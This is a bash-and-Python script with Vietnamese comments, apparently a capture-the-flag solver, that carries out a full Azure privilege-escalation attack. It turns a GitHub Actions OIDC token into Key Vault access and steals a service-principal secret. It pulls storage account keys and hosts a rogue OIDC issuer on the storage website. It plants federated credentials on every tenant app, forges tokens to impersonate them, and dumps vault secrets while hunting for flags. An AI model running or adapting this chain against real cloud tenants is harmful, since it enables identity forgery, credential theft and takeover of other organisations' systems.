#!/usr/bin/env bash
# v17 — enumerate resource group THỨ HAI (rg-tbl-reporting-prod-eus) + mọi RG khác,
#        bằng cả 14 app (FIC tạm). Tìm vault/storage/MI ở đó.
set +e
TEN="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"
RG=rg-tbl-platform-prod-sea; SA=sttblcilogsprodx3euoz
PROD=kv-tbl-prod-x3euoz
AUTO_APP=462d1c38-4459-48b8-9333-82e389e59514
HOST="https://$SA.z23.web.core.windows.net"
PFX="htx-$RANDOM$RANDOM"; SUBJECT="tbl-solver-htx"

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")
ASEC=$(curl -sS -H "Authorization: Bearer $KV" \
  "https://$PROD.vault.azure.net/secrets/sync-service-principal?api-version=7.4" \
  | python3 -c "
import sys,json;print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")
G=$(tok_sp "$AUTO_APP" "$ASEC" "https://graph.microsoft.com/.default")
ARMA=$(tok_sp "$AUTO_APP" "$ASEC" "https://management.azure.com/.default")
KEY0=$(curl -sS -X POST -H "Authorization: Bearer $ARMA" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" \
  | python3 -c "
import sys,json;print(json.load(sys.stdin)['keys'][0]['value'])")
curl -sS -H "Authorization: Bearer $G" \
  "https://graph.microsoft.com/v1.0/applications?\$top=100&\$select=id,appId,displayName" > /tmp/apps.json

pip -q install azure-storage-blob pyjwt cryptography >/dev/null 2>&1
python3 - "$SA" "$KEY0" "$HOST" "$PFX" "$SUBJECT" "$TEN" "$SUB" "$G" <<'PY'
import sys,json,time,uuid,base64,urllib.request,urllib.parse,re
from azure.storage.blob import BlobServiceClient, ContentSettings
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import jwt
sa,key0,host,pfx,subject,ten,sub,graph = sys.argv[1:9]
ISS=f"{host}/{pfx}"
FLAG=re.compile(r'DF26\{[^}]*\}')
svc=BlobServiceClient(f"https://{sa}.blob.core.windows.net",credential=key0)
web=svc.get_container_client("$web")
priv=rsa.generate_private_key(public_exponent=65537,key_size=2048)
pn=priv.public_key().public_numbers()
b64u=lambda i: base64.urlsafe_b64encode(i.to_bytes((i.bit_length()+7)//8,'big')).decode().rstrip('=')
KID="k-"+uuid.uuid4().hex[:8]
PEM=priv.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.PKCS8,serialization.NoEncryption())
JS=json.dumps({"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":KID,"n":b64u(pn.n),"e":b64u(pn.e)}]})
CFG=json.dumps({"issuer":ISS,"jwks_uri":ISS+"/jwks.json","response_types_supported":["id_token"],
 "subject_types_supported":["public"],"id_token_signing_alg_values_supported":["RS256"]})
ct=ContentSettings(content_type="application/json")
for p,b in ((f"{pfx}/jwks.json",JS),(f"{pfx}/.well-known/jwks.json",JS),(f"{pfx}/.well-known/openid-configuration",CFG)):
    web.upload_blob(p,b,overwrite=True,content_settings=ct)

def api(url,method="GET",tok=graph,body=None):
    d=json.dumps(body).encode() if body is not None else None
    r=urllib.request.Request(url,d,method=method,headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"})
    try:
        with urllib.request.urlopen(r,timeout=40) as f:
            t=f.read(); return json.loads(t) if t else {}
    except Exception as e:
        try: return {"error":json.loads(e.read())}
        except Exception: return {"error":str(e)[:90]}
def mint():
    n=int(time.time())
    return jwt.encode({"iss":ISS,"sub":subject,"aud":"api://AzureADTokenExchange","iat":n-60,
      "nbf":n-60,"exp":n+900,"jti":uuid.uuid4().hex},PEM,algorithm="RS256",headers={"kid":KID})
def exchange(app,scope):
    d=urllib.parse.urlencode({"client_id":app,"scope":scope,"grant_type":"client_credentials",
      "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
      "client_assertion":mint()}).encode()
    try:
        with urllib.request.urlopen(urllib.request.Request(
          f"https://login.microsoftonline.com/{ten}/oauth2/v2.0/token",d),timeout=30) as f:
            return json.load(f).get("access_token","")
    except Exception: return ""

apps=json.load(open("/tmp/apps.json"))["value"]
created=[]
for a in apps:
    r=api(f"https://graph.microsoft.com/v1.0/applications/{a['id']}/federatedIdentityCredentials","POST",
          body={"name":"tmp-"+pfx[:12],"issuer":ISS,"subject":subject,"audiences":["api://AzureADTokenExchange"]})
    if "error" not in r: created.append((a['id'],r.get("id"),a['appId'],a['displayName']))
print("[*] FIC tạm:",len(created)); time.sleep(45)

B="https://management.azure.com"
best=None
for oid,fid,appid,name in created:
    am=exchange(appid,B+"/.default")
    if not am: continue
    rgs=api(f"{B}/subscriptions/{sub}/resourcegroups?api-version=2021-04-01",tok=am)
    if "error" in rgs: continue
    names=[g["name"] for g in rgs.get("value",[])]
    print(f"  {name}: RGs = {names}")
    if len(names)>1 and not best: best=(name,appid,am,names)

if not best:
    print("[!] không app nào thấy >1 RG");
else:
    name,appid,am,names=best
    print(f"================ dùng {name} ================")
    for g in names:
        r=api(f"{B}/subscriptions/{sub}/resourceGroups/{g}/resources?api-version=2021-04-01",tok=am)
        print(f"-- {g}:", json.dumps(r)[:1200])
    # vault trong RG mới
    r=api(f"{B}/subscriptions/{sub}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01",tok=am)
    for v in r.get("value",[]):
        vn=v["name"]; uri=v["properties"]["vaultUri"].rstrip('/')
        kt=exchange(appid,"https://vault.azure.net/.default")
        if not kt: continue
        l=api(f"{uri}/secrets?api-version=7.4",tok=kt)
        if "error" in l: print(f"   {vn}: denied"); continue
        print(f"   {vn}: OK")
        for s in l.get("value",[]):
            gg=api(s["id"]+"?api-version=7.4",tok=kt)
            val=str(gg.get("value",""))
            f=FLAG.findall(val)
            print("     ",s["id"].split('/')[-1],"=", ("*** FLAG "+str(f)) if f else val[:400])

print("[*] dọn dẹp")
for oid,fid,appid,name in created:
    if fid: api(f"https://graph.microsoft.com/v1.0/applications/{oid}/federatedIdentityCredentials/{fid}","DELETE")
for p in (f"{pfx}/jwks.json",f"{pfx}/.well-known/jwks.json",f"{pfx}/.well-known/openid-configuration"):
    try: web.delete_blob(p)
    except Exception: pass
PY
echo "================ DONE ================"
